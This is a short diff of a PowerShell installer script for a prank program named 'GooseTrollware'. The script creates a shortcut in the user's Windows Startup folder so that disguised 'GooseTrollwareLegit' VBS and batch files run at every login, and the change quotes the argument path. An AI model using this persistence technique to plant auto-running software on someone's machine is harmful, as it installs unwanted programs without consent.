@@ -8,7 +8,7 @@ $gloc="GooseTrollware\GooseTrollwareLegit.bat"
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
 $Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.vbs"
-$Shortcut.Arguments = "$home\GooseTrollware\GooseTrollwareLegit.bat"
+$Shortcut.Arguments = "`"$home\GooseTrollware\GooseTrollwareLegit.bat`""
 $Shortcut.Save()
 
 # cp "GooseTrollware\GooseTrollwareLegit.lnk" "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
